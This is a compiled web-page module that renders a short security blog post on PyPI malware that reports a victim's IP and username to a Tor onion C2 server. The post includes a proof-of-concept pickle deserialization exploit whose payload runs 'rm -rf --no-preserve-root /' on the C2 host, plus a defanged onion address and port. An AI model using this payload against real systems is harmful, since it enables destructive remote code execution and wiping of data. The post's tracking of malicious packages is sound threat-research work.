import{S as fs,i as _s,s as ys,k as o,q as l,a as u,l as p,m as c,r as i,h as n,c as k,L as vs,n as ss,b as e,C as t,B as ns}from"./index-104dd4d8.js";function ws(ds){let d,U,R,f,W,H,M,O,_,Y,T,y,j,g,v,w,as,q,b,B,D,r,N,P,F,J,I,K,Q,L,h,ms=`<code class="language-py"><span class="token comment"># please don't actually run this :(</span>
<span class="token keyword">import</span> pickle
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> os

<span class="token keyword">class</span> <span class="token class-name">RCE</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        cmd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'rm -rf --no-preserve-root /'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">send_data</span><span class="token punctuation">(</span>conn<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    data_len_str <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
    header <span class="token operator">=</span> <span class="token string">'0'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">64</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data_len_str<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> data_len_str

    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>header<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

c2_link <span class="token operator">=</span> <span class="token string">'zuela32n363gucsyr5z4w635pmthnq4lsxod43r3yapu4vddn5qwcpad[.]onion'</span> <span class="token comment"># i've defanged this</span>
c2_port <span class="token operator">=</span> <span class="token number">1337</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    pickled <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>RCE<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>c2_link<span class="token punctuation">,</span> c2_port<span class="token punctuation">)</span> <span class="token comment"># yes, I know this doesn't work it's just pseudocode</span>
    send_data<span class="token punctuation">(</span>s<span class="token punctuation">,</span> pickled<span class="token punctuation">)</span></code>`,z,m,V,S,X,Z,A,E,C,$;return{c(){d=o("p"),U=l(`I\u2019ve recently been helping track threat actors that upload malware
to the PYPI package index (stuff that you can pip install).`),R=u(),f=o("p"),W=l("Here\u2019s a collection of madness"),H=u(),M=o("hr"),O=u(),_=o("h2"),Y=l("Tor Shenanigans"),T=u(),y=o("p"),j=l(`People think that when you put something behind tor it\u2019s really secure, super
hidden and impossible to find. This sample, however, proves the opposite.`),g=u(),v=o("p"),w=o("img"),q=u(),b=o("p"),B=l(`I\u2019ve deleted most of the boilerplate but in essence all it does is make a
socket connection to the onion service by setting it as a socks proxy.`),D=u(),r=o("p"),N=l(`It then sends your ip address (\u2018grabbed\u2019 from httpbin[.]com), username, etc
with the `),P=o("code"),F=l("send_data function"),J=l(`. Some people will see the glaring issue right
away but for those who haven\u2019t used python extensively, the `),I=o("code"),K=l("pickle.loads"),Q=l(`
function is vulnerable arbitrary python code execution. Here is a really
simple PoC to pwn the c2 server:`),L=u(),h=o("pre"),z=u(),m=o("p"),V=l("Running this code sample would execute the "),S=o("code"),X=l("rm -rf --no-preserve-root /"),Z=l(` command
on the remote server, wiping all files and folders from the system. We could also
deanonymise the server by having it call back to us. However, I\u2019ll leave that as
as exercise for the reader.`),A=u(),E=o("p"),C=o("strong"),$=l(`SERIOUS DISCLAMER: fr doe don\u2019t actually do bad things with this, no matter
who it is`),this.h()},l(s){d=p(s,"P",{});var a=c(d);U=i(a,`I\u2019ve recently been helping track threat actors that upload malware
to the PYPI package index (stuff that you can pip install).`),a.forEach(n),R=k(s),f=p(s,"P",{});var es=c(f);W=i(es,"Here\u2019s a collection of madness"),es.forEach(n),H=k(s),M=p(s,"HR",{}),O=k(s),_=p(s,"H2",{});var ts=c(_);Y=i(ts,"Tor Shenanigans"),ts.forEach(n),T=k(s),y=p(s,"P",{});var os=c(y);j=i(os,`People think that when you put something behind tor it\u2019s really secure, super
hidden and impossible to find. This sample, however, proves the opposite.`),os.forEach(n),g=k(s),v=p(s,"P",{});var ps=c(v);w=p(ps,"IMG",{src:!0,alt:!0}),ps.forEach(n),q=k(s),b=p(s,"P",{});var ls=c(b);B=i(ls,`I\u2019ve deleted most of the boilerplate but in essence all it does is make a
socket connection to the onion service by setting it as a socks proxy.`),ls.forEach(n),D=k(s),r=p(s,"P",{});var x=c(r);N=i(x,`It then sends your ip address (\u2018grabbed\u2019 from httpbin[.]com), username, etc
with the `),P=p(x,"CODE",{});var cs=c(P);F=i(cs,"send_data function"),cs.forEach(n),J=i(x,`. Some people will see the glaring issue right
away but for those who haven\u2019t used python extensively, the `),I=p(x,"CODE",{});var is=c(I);K=i(is,"pickle.loads"),is.forEach(n),Q=i(x,`
function is vulnerable arbitrary python code execution. Here is a really
simple PoC to pwn the c2 server:`),x.forEach(n),L=k(s),h=p(s,"PRE",{class:!0});var hs=c(h);hs.forEach(n),z=k(s),m=p(s,"P",{});var G=c(m);V=i(G,"Running this code sample would execute the "),S=p(G,"CODE",{});var rs=c(S);X=i(rs,"rm -rf --no-preserve-root /"),rs.forEach(n),Z=i(G,` command
on the remote server, wiping all files and folders from the system. We could also
deanonymise the server by having it call back to us. However, I\u2019ll leave that as
as exercise for the reader.`),G.forEach(n),A=k(s),E=p(s,"P",{});var us=c(E);C=p(us,"STRONG",{});var ks=c(C);$=i(ks,`SERIOUS DISCLAMER: fr doe don\u2019t actually do bad things with this, no matter
who it is`),ks.forEach(n),us.forEach(n),this.h()},h(){vs(w.src,as="/i/more_malware_tor.png")||ss(w,"src",as),ss(w,"alt","tor shenanigans"),ss(h,"class","language-py")},m(s,a){e(s,d,a),t(d,U),e(s,R,a),e(s,f,a),t(f,W),e(s,H,a),e(s,M,a),e(s,O,a),e(s,_,a),t(_,Y),e(s,T,a),e(s,y,a),t(y,j),e(s,g,a),e(s,v,a),t(v,w),e(s,q,a),e(s,b,a),t(b,B),e(s,D,a),e(s,r,a),t(r,N),t(r,P),t(P,F),t(r,J),t(r,I),t(I,K),t(r,Q),e(s,L,a),e(s,h,a),h.innerHTML=ms,e(s,z,a),e(s,m,a),t(m,V),t(m,S),t(S,X),t(m,Z),e(s,A,a),e(s,E,a),t(E,C),t(C,$)},p:ns,i:ns,o:ns,d(s){s&&n(d),s&&n(R),s&&n(f),s&&n(H),s&&n(M),s&&n(O),s&&n(_),s&&n(T),s&&n(y),s&&n(g),s&&n(v),s&&n(q),s&&n(b),s&&n(D),s&&n(r),s&&n(L),s&&n(h),s&&n(z),s&&n(m),s&&n(A),s&&n(E)}}}const Es={title:"Malware madness",date:"2023-4-24"};class xs extends fs{constructor(d){super(),_s(this,d,null,ws,ys,{})}}export{xs as default,Es as metadata};
